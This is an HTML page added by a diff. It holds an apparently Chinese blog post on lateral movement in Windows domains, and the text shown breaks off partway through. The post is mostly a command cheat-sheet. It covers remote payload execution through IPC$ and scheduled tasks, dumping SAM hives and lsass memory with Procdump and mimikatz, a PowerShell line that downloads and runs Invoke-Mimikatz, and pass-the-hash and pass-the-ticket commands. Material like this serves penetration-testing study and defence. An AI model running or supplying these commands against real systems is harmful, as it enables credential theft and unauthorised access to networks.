@@ -1,0 +1,1042 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>域内横向移动分析 - Geekby&#39;s Blog</title><meta name="Description" content="域内横向移动分析相关"><meta property="og:title" content="域内横向移动分析" />
+<meta property="og:description" content="域内横向移动分析相关" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-02-17T11:25:00+08:00" />
+<meta property="article:modified_time" content="2020-02-17T11:25:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="域内横向移动分析"/>
+<meta name="twitter:description" content="域内横向移动分析相关"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/" /><link rel="prev" href="https://www.geekby.site/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/" /><link rel="next" href="https://www.geekby.site/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "域内横向移动分析",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2020\/02\/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "域安全, 内网渗透, 横向移动","wordcount":  775 ,
+        "url": "https:\/\/www.geekby.site\/2020\/02\/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90\/","datePublished": "2020-02-17T11:25:00+08:00","dateModified": "2020-02-17T11:25:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "域内横向移动分析相关"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">域内横向移动分析</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw"></i>内网渗透</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-02-17">2020-02-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 775 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#常用-windows-远程连接和相关命令">常用 Windows 远程连接和相关命令</a>
+      <ul>
+        <li><a href="#ipc">IPC</a>
+          <ul>
+            <li><a href="#ipc-的利用条件">IPC 的利用条件</a></li>
+          </ul>
+        </li>
+        <li><a href="#使用-windows-自带的工具获取远程主机信息">使用 Windows 自带的工具获取远程主机信息</a>
+          <ul>
+            <li><a href="#dir-命令">dir 命令</a></li>
+            <li><a href="#tasklist-命令">tasklist 命令</a></li>
+          </ul>
+        </li>
+        <li><a href="#计划任务">计划任务</a>
+          <ul>
+            <li><a href="#at-命令">at 命令</a>
+              <ul>
+                <li><a href="#查看目标系统时间">查看目标系统时间</a></li>
+                <li><a href="#将-payload-复制到目标系统中">将 payload 复制到目标系统中</a></li>
+                <li><a href="#使用-at-命令创建计划任务">使用 at 命令创建计划任务</a></li>
+                <li><a href="#清除-at-记录">清除 at 记录</a></li>
+              </ul>
+            </li>
+            <li><a href="#schtask-命令">schtask 命令</a>
+              <ul>
+                <li><a href="#建立-ipc-连接">建立 IPC 连接</a></li>
+                <li><a href="#创建名为-task-的计划任务">创建名为 task 的计划任务</a></li>
+                <li><a href="#执行该计划任务">执行该计划任务</a></li>
+                <li><a href="#删除计划任务">删除计划任务</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#windows-系统散列值获取">Windows 系统散列值获取</a>
+      <ul>
+        <li><a href="#单机密码抓取">单机密码抓取</a>
+          <ul>
+            <li><a href="#getpass">GetPass</a></li>
+            <li><a href="#pwdump7">PwDump7</a></li>
+            <li><a href="#通过-sam-和-system-文件抓取密码">通过 SAM 和 SYSTEM 文件抓取密码</a>
+              <ul>
+                <li><a href="#导出-sam-和-system-文件">导出 SAM 和 System 文件</a></li>
+                <li><a href="#通过读取-sam-和-system-文件获得-ntlm-hash">通过读取 SAM 和 System 文件获得 NTLM Hash</a></li>
+                <li><a href="#使用-mimikatz-在线读取-sam-文件">使用 mimikatz 在线读取 SAM 文件</a></li>
+                <li><a href="#使用-mimikatz-离线读取-lassdmp-文件">使用 mimikatz 离线读取 lass.dmp 文件</a>
+                  <ul>
+                    <li><a href="#导出-lassdmp-文件">导出 lass.dmp 文件</a></li>
+                    <li><a href="#使用-mimikatz-导出-lsassdmp-文件中的密码值">使用 mimikatz 导出 lsass.dmp 文件中的密码值</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#使用-powershell-对散列值进行-dump-操作">使用 Powershell 对散列值进行 Dump 操作</a></li>
+            <li><a href="#使用-powershell-远程加载-mimikatz-抓取散列值和明文密码">使用 Powershell 远程加载 mimikatz 抓取散列值和明文密码</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#哈希传递攻击">哈希传递攻击</a>
+      <ul>
+        <li><a href="#使用-ntlm-hash-进行哈希传递">使用 NTLM Hash 进行哈希传递</a></li>
+        <li><a href="#使用-aes-256-密钥进行哈希传递">使用 AES-256 密钥进行哈希传递</a></li>
+      </ul>
+    </li>
+    <li><a href="#票据传递">票据传递</a>
+      <ul>
+        <li><a href="#使用-mimikatz-进行票据传递">使用 mimikatz 进行票据传递</a>
+          <ul>
+            <li><a href="#导出票据">导出票据</a></li>
+            <li><a href="#注入票据">注入票据</a></li>
+          </ul>
+        </li>
+        <li><a href="#使用-kekeo-进行票据传递">使用 kekeo 进行票据传递</a>
+          <ul>
+            <li><a href="#生成票据文件">生成票据文件</a></li>
+            <li><a href="#将票据文件导入内存">将票据文件导入内存</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#psexec-的使用">PsExec 的使用</a>
+      <ul>
+        <li><a href="#pstools-工具中的-psexec">PsTools 工具中的 PsExec</a>
+          <ul>
+            <li><a href="#建立-ipc-连接-1">建立 IPC 连接</a></li>
+            <li><a href="#获取-system-权限的-交互式shell">获取 System 权限的 交互式shell</a></li>
+          </ul>
+        </li>
+        <li><a href="#metasploit-中的-psexec-模块">Metasploit 中的 psexec 模块</a></li>
+      </ul>
+    </li>
+    <li><a href="#wmi-的使用">WMI 的使用</a>
+      <ul>
+        <li><a href="#基本命令">基本命令</a></li>
+        <li><a href="#impacket-包中的-wmiexec">impacket 包中的 wmiexec</a></li>
+        <li><a href="#wmiexecvbs">wmiexec.vbs</a></li>
+        <li><a href="#invoke-wmicommand">Invoke-WmiCommand</a></li>
+        <li><a href="#invoke-wmimethod">Invoke-WMIMethod</a></li>
+      </ul>
+    </li>
+    <li><a href="#永恒之蓝漏洞">永恒之蓝漏洞</a></li>
+    <li><a href="#smbexec">smbexec</a>
+      <ul>
+        <li><a href="#c-版本-smbexec">C++ 版本 smbexec</a></li>
+        <li><a href="#impacket-工具包中的-smbexecpy">impacket 工具包中的 smbexec.py</a></li>
+      </ul>
+    </li>
+    <li><a href="#dcom-在远程系统中的使用">DCOM 在远程系统中的使用</a>
+      <ul>
+        <li><a href="#通过本地-dcom-执行命令">通过本地 DCOM 执行命令</a>
+          <ul>
+            <li><a href="#获取-dcom-程序列表">获取 DCOM 程序列表</a></li>
+            <li><a href="#使用-dcom-执行任意命令">使用 DCOM 执行任意命令</a></li>
+          </ul>
+        </li>
+        <li><a href="#使用-dcom-在远程机器上执行命令">使用 DCOM 在远程机器上执行命令</a>
+          <ul>
+            <li><a href="#使用-ipc-连接远程计算机">使用 IPC$ 连接远程计算机</a></li>
+            <li><a href="#执行命令">执行命令</a>
+              <ul>
+                <li><a href="#调用-mmc20_application-远程执行命令">调用 MMC20_Application 远程执行命令</a></li>
+              </ul>
+            </li>
+            <li><a href="#调用-9ba05972-f6a8-11cf-a442-00a0c90a8f39">调用 9BA05972-F6A8-11CF-A442-00A0C90A8F39</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#spn-在域环境中的使用">SPN 在域环境中的使用</a>
+      <ul>
+        <li><a href="#spn-扫描">SPN 扫描</a>
+          <ul>
+            <li><a href="#利用-spn-发现域中所有的-mssql-服务">利用 SPN 发现域中所有的 MSSQL 服务</a></li>
+            <li><a href="#扫描域中所有的-spn-信息">扫描域中所有的 SPN 信息</a></li>
+          </ul>
+        </li>
+        <li><a href="#exchange-邮件服务器攻击">Exchange 邮件服务器攻击</a></li>
+        <li><a href="#exchange-服务发现">Exchange 服务发现</a>
+          <ul>
+            <li><a href="#基于端口扫描发现">基于端口扫描发现</a></li>
+            <li><a href="#spn-查询">SPN 查询</a></li>
+          </ul>
+        </li>
+        <li><a href="#exchange-的基本操作">Exchange 的基本操作</a>
+          <ul>
+            <li><a href="#查看邮件数据库">查看邮件数据库</a></li>
+            <li><a href="#获取现有用户的邮件地址">获取现有用户的邮件地址</a></li>
+            <li><a href="#查看指定用户的邮箱使用信息">查看指定用户的邮箱使用信息</a></li>
+            <li><a href="#获取用户邮箱中的邮件数量">获取用户邮箱中的邮件数量</a></li>
+          </ul>
+        </li>
+        <li><a href="#导出指定的电子邮件">导出指定的电子邮件</a>
+          <ul>
+            <li><a href="#配置用户的导入导出权限">配置用户的导入、导出权限</a>
+              <ul>
+                <li><a href="#查看用户权限">查看用户权限</a></li>
+                <li><a href="#添加权限">添加权限</a></li>
+                <li><a href="#删除权限">删除权限</a></li>
+              </ul>
+            </li>
+            <li><a href="#设置网络共享文件夹">设置网络共享文件夹</a></li>
+            <li><a href="#导出用户的电子邮件">导出用户的电子邮件</a></li>
+            <li><a href="#管理导出请求">管理导出请求</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="域内横向移动分析">域内横向移动分析</h1>
+<h2 id="常用-windows-远程连接和相关命令">常用 Windows 远程连接和相关命令</h2>
+<h3 id="ipc">IPC</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net use \\IP\ipc$ <span class="s2">&#34;password&#34;</span> /user:Administrator
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="ipc-的利用条件">IPC 的利用条件</h4>
+<ul>
+<li>开启 139 端口</li>
+<li>管理员开启了默认共享</li>
+</ul>
+<h3 id="使用-windows-自带的工具获取远程主机信息">使用 Windows 自带的工具获取远程主机信息</h3>
+<h4 id="dir-命令">dir 命令</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="k">dir</span> \\IP\c$
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="tasklist-命令">tasklist 命令</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">tasklist /S IP /U administrator /P password
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="计划任务">计划任务</h3>
+<h4 id="at-命令">at 命令</h4>
+<p>主要在 Windows server 2008 之前版本</p>
+<h5 id="查看目标系统时间">查看目标系统时间</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net time \\IP
+</code></pre></td></tr></table>
+</div>
+</div><h5 id="将-payload-复制到目标系统中">将 payload 复制到目标系统中</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="k">copy</span> payload.bat \\IP\C$
+</code></pre></td></tr></table>
+</div>
+</div><h5 id="使用-at-命令创建计划任务">使用 at 命令创建计划任务</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">at \\IP 8:00AM C:\payload.bat
+</code></pre></td></tr></table>
+</div>
+</div><p>返回一个计划任务 ID</p>
+<h5 id="清除-at-记录">清除 at 记录</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">at \\IP taskID /delete
+</code></pre></td></tr></table>
+</div>
+</div><p>使用 at 将执行结果保存到远程，再读取结果：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">at \\IP 8:00AM cmd.exe /c <span class="s2">&#34;ipconfig &gt; C:/1.txt&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="k">type</span> \\IP\C$\1.txt
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="schtask-命令">schtask 命令</h4>
+<h5 id="建立-ipc-连接">建立 IPC 连接</h5>
+<h5 id="创建名为-task-的计划任务">创建名为 task 的计划任务</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">schtask /create /s IP /tn test /sc onstart /tr c:\payload.bat /ru system /f
+</code></pre></td></tr></table>
+</div>
+</div><h5 id="执行该计划任务">执行该计划任务</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">schtask /run /s IP /i /tn <span class="s2">&#34;test&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h5 id="删除计划任务">删除计划任务</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">schtask /delete /s IP /tn <span class="s2">&#34;test&#34;</span> /f
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="windows-系统散列值获取">Windows 系统散列值获取</h2>
+<h3 id="单机密码抓取">单机密码抓取</h3>
+<h4 id="getpass">GetPass</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">GetPassword_x64.exe
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="pwdump7">PwDump7</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">PwDump7.exe
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="通过-sam-和-system-文件抓取密码">通过 SAM 和 SYSTEM 文件抓取密码</h4>
+<h5 id="导出-sam-和-system-文件">导出 SAM 和 System 文件</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">reg save hklm\sam sam.hive
+reg save hklm\system system.hive
+</code></pre></td></tr></table>
+</div>
+</div><h5 id="通过读取-sam-和-system-文件获得-ntlm-hash">通过读取 SAM 和 System 文件获得 NTLM Hash</h5>
+<ul>
+<li>mimikatz</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">lsadump::sam /sam:sam.hive system:system.hive
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>cain</li>
+<li>目标机器使用 mimikatz 直接读取本地 SAM 文件</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">privilege::debug
+lsadump::sam
+</code></pre></td></tr></table>
+</div>
+</div><h5 id="使用-mimikatz-在线读取-sam-文件">使用 mimikatz 在线读取 SAM 文件</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">mimikatz.exe <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;log&#34;</span> <span class="s2">&#34;sekurlsa::loginpasswords&#34;</span> 
+</code></pre></td></tr></table>
+</div>
+</div><h5 id="使用-mimikatz-离线读取-lassdmp-文件">使用 mimikatz 离线读取 lass.dmp 文件</h5>
+<h6 id="导出-lassdmp-文件">导出 lass.dmp 文件</h6>
+<ul>
+<li>使用任务管理器导出 lsass.dmp 文件</li>
+</ul>
+<p>任务管理器找到 <code>lsass.exe</code> 进程，右键，选择 &ldquo;Create Dump File&rdquo; 选项</p>
+<ul>
+<li>使用 Procdump 导出 lsass.dmp 文件</li>
+</ul>
+<p>微软官方发布的工具，免杀</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+</code></pre></td></tr></table>
+</div>
+</div><h6 id="使用-mimikatz-导出-lsassdmp-文件中的密码值">使用 mimikatz 导出 lsass.dmp 文件中的密码值</h6>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">sekurlsa::mimidump lsass.dmp
+sekurlsa::logonpasswords full
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="使用-powershell-对散列值进行-dump-操作">使用 Powershell 对散列值进行 Dump 操作</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Get-PassHashes</span><span class="p">.</span><span class="n">ps1</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="使用-powershell-远程加载-mimikatz-抓取散列值和明文密码">使用 Powershell 远程加载 mimikatz 抓取散列值和明文密码</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span> <span class="s2">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PwoerSploit/master/Exfilration/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="哈希传递攻击">哈希传递攻击</h2>
+<h3 id="使用-ntlm-hash-进行哈希传递">使用 NTLM Hash 进行哈希传递</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">mimikatz <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;sekurlsa::pth /user:administrator /domain:pentest.hacker /ntlm:[NTLM]&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="使用-aes-256-密钥进行哈希传递">使用 AES-256 密钥进行哈希传递</h3>
+<p>使用 mimikatz 抓取 AES-256 密钥</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">mimikatz <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;sekurlsa::ekeys&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>pth攻击（目标机器必须安装 KB2871997）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">mimikatz <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;sekurlsa::pth /user:administrator /domain:pentest.hacker /aes256:[aes256]&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="票据传递">票据传递</h2>
+<h3 id="使用-mimikatz-进行票据传递">使用 mimikatz 进行票据传递</h3>
+<h4 id="导出票据">导出票据</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">mimikatz <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;sekurlsa::tickets /exports&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="注入票据">注入票据</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">mimikatz <span class="s2">&#34;kerberos::ptt&#34;</span> <span class="s2">&#34;C:\xxx.kirbi&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="使用-kekeo-进行票据传递">使用 kekeo 进行票据传递</h3>
+<h4 id="生成票据文件">生成票据文件</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">kekeo <span class="s2">&#34;tgt:ask /user:administrator /domain:pentest.hack /ntlm:[NTLM]&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="将票据文件导入内存">将票据文件导入内存</h4>
